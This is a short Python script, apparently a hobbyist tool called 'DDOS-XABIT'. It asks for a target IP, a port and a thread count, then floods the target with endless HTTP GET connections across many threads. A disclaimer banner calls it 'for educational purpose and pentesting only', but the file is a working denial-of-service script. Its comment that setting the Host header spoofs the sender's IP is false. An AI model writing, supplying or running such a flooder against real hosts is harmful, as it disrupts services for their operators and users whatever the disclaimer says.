import socket 
import threading
import os  # For system commands

# Function to display Figlet banner
def display_banner():
    # Run figlet command to generate banner with DDOS font and store output
    banner_output = os.popen('figlet -f DDOS -t "DDOS-XABIT"').read()
    # Print banner in green color using ANSI escape code
    print("\033[32m" + banner_output.strip() + "\033[0m")  # Strip to remove extra newline

# Function to display additional text in red color
def display_additional_text():
    print("\033[31mfor educational purpose and pentesting only\033[0m")

# Taking user input for attack parameters
target = input("ENTER THE TARGET IP ADDRESS: ")
port = int(input("Enter port number: "))
threads = int(input("Enter number of threads: "))

# Global variable to count attacks
attack_num = 0

# Function to perform the DDoS attack
def attack():
    global attack_num
    while True:
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to target
            s.connect((target, port))
            # Spoofed IP address (modify as needed)
            fake_ip = "192.168.1.100"
            # Send HTTP GET request with spoofed Host header
            s.sendto(f"GET / HTTP/1.1\r\n".encode('ascii'), (target, port))
            s.sendto(f"Host: {fake_ip}\r\n\r\n".encode('ascii'), (target, port))
            # Increment attack count
            attack_num += 1
            # Print number of packets sent in green color
            print(f"\033[32mSent {attack_num} packets to {target}:{port}\033[0m")
            # Close the socket
            s.close()
        except socket.error as e:
            print(f"Error: {e}")

# Display Figlet banner
display_banner()

# Display additional text in red color
display_additional_text()

# Create multiple threads for the attack
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()


#HAPPY HACKING JOURNEY 
#BEST REGARDS FROM XABIT 

# ONLY FOR EDUCATIONAL PURPOSES
